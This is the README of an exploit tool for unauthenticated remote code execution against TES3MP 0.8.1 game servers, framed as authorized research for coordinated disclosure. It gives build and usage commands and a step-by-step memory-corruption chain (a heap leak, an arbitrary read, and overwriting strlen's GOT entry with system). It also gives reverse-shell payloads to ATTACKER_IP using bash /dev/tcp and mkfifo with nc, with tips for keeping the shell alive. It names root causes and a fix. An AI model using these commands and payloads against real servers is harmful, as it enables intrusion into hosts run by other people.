# tes3mp-rce

Remote code execution against **TES3MP 0.8.1** dedicated servers, demonstrated end-to-end against the
distributed release binary (`tes3mp-server.x86_64`). Runs one command on the server host as the account
the server runs under.

> **Authorized security research.** This targets the author's own infrastructure in an isolated lab, and
> exists for coordinated disclosure to TES3MP upstream and for hardening the author's own deployment.
> Do not point it at a server you do not own or lack written permission to test.

## What it needs, and what it does not

| Requirement | Needed? |
|---|---|
| Network reach to the game port | **yes** |
| The server's connection password (`password` in `tes3mp-server-default.cfg`) | **only if the server sets one** (`-P`) |
| A registered user account | **no** |
| A user account password | **no** |
| Any in-game rank, staff status, or privilege | **no** |
| A prior login of any kind | **no** |

The distinction matters and is easy to get wrong. TES3MP has **two independent secrets**:

1. **The server password** — one shared string, set by the admin in the server config, checked in C++ at
   `ID_SYSTEM_HANDSHAKE` (`apps/openmw-mp/Networking.cpp:118`). A wrong value gets the client kicked before
   `setHandshake()`, and every packet this exploit uses is gated on `isHandshaked()`. So on a passworded
   server you must pass it with `-P`. The upstream default config ships this **empty**.
2. **User accounts** — usernames and passwords managed entirely by CoreScripts (Lua). This exploit never
   registers, never logs in, and no account file is ever created. The C++ packet layer gates on the
   handshake and `POSTLOADED` only, and never consults the Lua-side account state.

So the accurate severity statement is:

* **Default-configured server (no `password` set): unauthenticated remote code execution.** No secret of
  any kind is required.
* **Passworded server: remote code execution for anyone who knows the server password** — i.e. every
  player who can connect at all, including players who have never created an account. A shared connection
  password is not an authorization boundary; it is the ticket to the front door that every player already has.

All four cases were measured rather than reasoned about (`evidence/server-password-matrix.txt`):

| Server | `-P` | Outcome |
|---|---|---|
| no password | — | command executed |
| passworded | omitted | kicked: `Wrong server password  used by client at ...` |
| passworded | wrong | kicked: `Wrong server password hunter2 used by client at ...` |
| passworded | correct | command executed, **`account files created: 0`** |

The RakNet-level connect token (`-t`) is **not** a secret: it is `TES3MP_VERSION + TES3MP_PROTO_VERSION +
commitHash`, identical for every stock client of a given build, and is a version-compatibility check.

## Build

Needs the RakNet/CrabNet headers and static library that the TES3MP build links, plus the TES3MP source
tree for `components/openmw-mp/NetworkMessages.hpp`.

```sh
make RAKNET_DIR=/path/to/raknet TES3MP_SRC=/path/to/TES3MP
```

`RAKNET_DIR` must contain `include/raknet/RakPeerInterface.h` and `lib/libRakNetLibStatic.a`.
Defaults match the author's lab (`/srv/fuzz/tes3mp/raknet`, `/srv/fuzz/tes3mp/src/TES3MP`).

The equivalent one-liner, if you would rather skip make:

```sh
g++ -O2 -w -std=c++17 src/tes3mp-rce.cc -o tes3mp-rce \
    -I/path/to/raknet/include/raknet -I/path/to/TES3MP \
    -L/path/to/raknet/lib -lRakNetLibStatic -lpthread
```

## Use

```sh
# server with no password (upstream default)
./tes3mp-rce 10.0.0.5

# server with a password
./tes3mp-rce -P 'correct horse battery staple' 10.0.0.5 25565

# choose the command
./tes3mp-rce -P '...' -c 'touch /tmp/proof' 10.0.0.5
```

```
-P, --server-password <pw>  server `password` setting. Not a user account.
-c, --command <cmd>         command to run (default: touch /tmp/tes3mp-rce-proof)
-t, --token <tok>           version token: TES3MP_VERSION+PROTO+commitHash (public, per build)
-b, --bind <ip>             local address for the second client (default 127.0.0.2)
-n, --name <base>           player name prefix
-C, --cell <name>           cell the two clients meet in
-v, --verbose               show relay parsing
```

Two client connections are used: **A** performs the attack, **R** sits in the same cell and receives the
relayed packets that carry the leaked bytes. On one host they are separated by `-b`; in a real attack they
would simply be two connections.

**Payloads should exit 0, and anything long-running must be backgrounded.** After the overwrite, `strlen`
returns the command's exit status, and that value is used as a string length elsewhere in the server, so a
failing or blocking command destabilises the process quickly. `touch /tmp/x` is fine as-is.

### Reverse shell

```sh
# on the attacking host
nc -lvnp 4444

# then
./tes3mp-rce -P 'server-password' \
  -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &" \
  victim.example.net
```

Three details, each of which is load-bearing:

* **The trailing `&` is mandatory.** `system()` blocks until the command finishes. Without it the server's
  packet loop stalls for as long as the shell is open, and the shell's eventual exit status is then used as
  a string length.
* **The inner `/bin/bash -c` wrapper is required.** `system()` runs the payload with `/bin/sh`, which on
  Debian/Ubuntu is `dash` — and dash supports neither `/dev/tcp/...` nor the `>&` redirection. The wrapper
  hands those bash-only features to bash.
* **Quote it as `-c "... '...' &"`** — double quotes outside, single quotes inside — so your own shell
  passes the whole thing through as one argument.

If bash is not on the target, a portable alternative:

```sh
-c "rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f) &"
```

**Expect the server process to die shortly afterwards.** `strlen` remains hijacked, so the next few string
operations inside the server misbehave. The shell is a detached child and survives the server's death; it
does not survive the host rebooting. This is why the disclosure PoC uses the marker payload instead: it
proves execution without leaving the service in a broken state.

## How it works

Seven steps; see `docs/CHAIN.md` for the full detail and the measured constants.

1. **Heap pointer leak.** A truncated `ID_PLAYER_EQUIPMENT` for index 25 relays `chatMessage._M_p` back out.
   `RW()`'s failure return is discarded, so the server serializes the out-of-bounds field unmodified.
2. **Groom.** `ID_PLAYER_ANIM_PLAY` parks that pointer in `animation.mode|count`, which is where index 28's
   out-of-bounds string assignment will write, making the assignment survivable.
3. **Object base.** A truncated index 28 relays `creatureRefId._M_p`, which is a self-pointer (the string is
   permanently short, so it points at its own buffer). `base = leaked - 0x16F0`.
4. **Image base.** Arbitrary read of `*(base-8)` gives `vtable for Player + 16`; subtract its RVA. Asserted
   page-aligned, so a bad read is rejected instead of being used.
5. **libc base.** Arbitrary read of the resolved `malloc@got`. Deliberately not `strlen@got`: `strlen` is an
   **IFUNC**, so its GOT holds the selected implementation, not the nominal symbol.
6. **Plant.** Aim `eq[7].refId` at `strlen@got`, with `capacity` set high enough that the assignment takes
   the in-place path rather than reallocating (which would `free()` the GOT address).
7. **Execute.** One equipment packet carrying two **in-bounds** items: item 7's `refId` assignment writes
   `system` into `strlen@got`, and item 5's assignment then calls the now-hijacked `strlen` **on the payload**,
   because `std::string::operator=(const char*)` calls `traits_type::length()` on its *source*. Both halves
   land inside a single deserialize, with no logging in between to trip over the corrupted `strlen`.

The arbitrary read (steps 4-5) works by planting a fake `std::string{_M_p = target, _M_len = 8}` in an
equipment `refId` and triggering a cell-change relay, which serializes 8 bytes read from `target` to the
other client.

## Root causes

1. **Unvalidated `equipmentIndex`** (`components/openmw-mp/Packets/Player/PacketPlayerEquipment.cpp:42`)
   gives an out-of-bounds read and write across the `Item[19]` array at 80-byte stride. Sibling packets
   already bounds-check (`Attribute >= 8`, `Skill >= 27`, `StatsDynamic >= 3`); this one does not.
2. **`RW()` return values are discarded**, so a deliberately truncated packet still performs assignments,
   turning "stream exhausted" into a write through a corrupted pointer.
3. **Partial RELRO** — `GNU_RELRO` ends exactly at `.got.plt` (RVA `0x2c3000`), which is `WA`, leaving
   301 `JUMP_SLOT` entries writable for the process lifetime.

Fixing (1) alone breaks the chain at step 1.

## Target profile

Constants in `Profile` (top of `src/tes3mp-rce.cc`) are measured against the distributed 0.8.1 Linux build
and Ubuntu 24.04's glibc 2.39. Against another build, re-measure:

```sh
readelf -rW tes3mp-server.x86_64 | grep -E ' (strlen|malloc)@'   # GOT slots
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -wE 'system|malloc' # libc offsets
# vtable RVA: attach gdb, `info symbol` the value the exploit reads at base-8
```

## Status

Demonstrated with a non-destructive marker payload, 20/20 cold starts against a fresh server with fresh
ASLR each run. Reliability is measured on an idle lab server; a busy server with competing packet traffic
is untested and would be expected to degrade.
